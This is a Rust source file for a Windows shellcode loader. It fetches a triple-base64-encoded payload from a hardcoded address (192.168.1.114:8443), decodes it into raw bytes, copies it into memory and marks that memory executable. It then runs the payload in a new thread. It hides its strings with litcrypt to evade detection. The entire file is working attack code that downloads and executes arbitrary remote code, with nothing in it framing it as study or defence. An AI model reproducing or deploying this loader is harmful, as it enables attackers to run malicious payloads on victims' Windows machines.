extern crate reqwest;
extern crate base64;
extern crate tokio;
extern crate windows;
extern crate litcrypt;

use std::ptr;
use std::ffi::c_void;
use reqwest::Client;
use base64::decode;
use windows::{
    Win32::Foundation::{BOOL, GetLastError},
    Win32::System::Memory::{
        VirtualAlloc, 
        VirtualProtect, 
        PAGE_PROTECTION_FLAGS,
        MEM_COMMIT,
        MEM_RESERVE,
        PAGE_READWRITE,
        PAGE_EXECUTE_READ,
    },
    Win32::System::Threading::{
        CreateThread,
        WaitForSingleObject,
        THREAD_CREATION_FLAGS
    },
    Win32::System::WindowsProgramming::INFINITE
};


use litcrypt::{lc, use_litcrypt};

use_litcrypt!();


/// The URL where shellcode will be downloaded from
const URL: &str = "http://192.168.1.114:8443/note.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 3;

fn decode_shellcode(sc: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
    for _i in 0..b64_iterations {
        match decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d
                    .into_iter()
                    .filter(|&b| b != 0x0a)
                    .collect();
            },
            Err(e) => { 
                let err_msg = e.to_string();
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}

async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            // Get the shellcode. Now we have to decode it
            let shellcode_decoded: Vec<u8>;
            let shellcode_final_vec: Vec<u8>;
            if let Ok(sc) = r.text().await {
                match decode_shellcode(sc, b64_iterations) {
                    Ok(scd) => { shellcode_decoded = scd; },
                    Err(e)  => { return Err(e); }
                }; 
    
                // Convert bytes to our proper string
                // This only happens on Windows
                let shellcode_string: String;
                if let Ok(s) = String::from_utf8(shellcode_decoded) {
                    shellcode_string = s;
                } else {
                    let err_msg = lc!("Could not convert bytes to string");
                    return Err(err_msg);
                }                    
                // At this point, we have the comma-separated "0xNN" form of the shellcode.
                // We need to get each one until a proper u8.
                // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
                // Not '0x' strings for Linux.
                shellcode_final_vec = shellcode_string
                    .split(",")
                    .map(|s| s.replace("0x", ""))
                    .map(|s| s.replace(" ", ""))                    
                    .map(|s|{ 
                        match u8::from_str_radix(&s, 16) {
                            Ok(b) => b,
                            Err(_) => 0
                        }
                    })
                    .collect();
                
                // The actual success
                return Ok(shellcode_final_vec);

            } else {
                let err_msg = lc!("Could not decode shellcode");
                return Err(err_msg);
            }

        } else {
            return Err(r.text().await.unwrap());
        }   

    } else {
        return Err(lc!("Could not download shellcode"));
    }
} 

#[tokio::main]
async fn main() {

    // Grab b64-encoded data from the provided url
    // Decode n_iters times
    // CreateThread with the shellcode
    if let Ok(shellcode) = get_shellcode(URL.to_string(), B64_ITERATIONS).await {

        unsafe {
            let base_addr = VirtualAlloc(
                ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if base_addr.is_null() {
                println!("{}", lc!("Couldn't allocate memory to current proc."));
            } else {
                println!("{}", lc!("Allocated memory to current proc."));
            }

            // copy shellcode into mem
            println!("{}", lc!("Copying Shellcode to address in current proc."));
            std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
            println!("{}", lc!("Copied..."));

            // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
            println!("{}", lc!("Changing mem protections to RX..."));

            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;

            let mem_protect: BOOL = VirtualProtect(
                base_addr,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );

            if mem_protect.0 == 0{
                return println!("{}", lc!("Error during injection"));
            }

            // Call CreateThread
            println!("{}", lc!("Calling CreateThread..."));

            let mut tid = 0;
            let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };

            let h_thread = CreateThread(
                ptr::null_mut(),
                0,
                Some(ep),
                ptr::null_mut(),
                THREAD_CREATION_FLAGS(0),
                &mut tid,
            ).unwrap();

            if h_thread.is_invalid() {
                println!("{}", lc!("Error during inject."));
            } else {
                println!("Thread Id: {tid}");
            }
            
            if WaitForSingleObject(h_thread, INFINITE) == 0 {
               println!("{}", lc!("Good!"));
               println!("{}", lc!("Injection completed!"));
            } else {
               let error = GetLastError();
               println!("{:?}", error);
            }
        }
    }
    
}
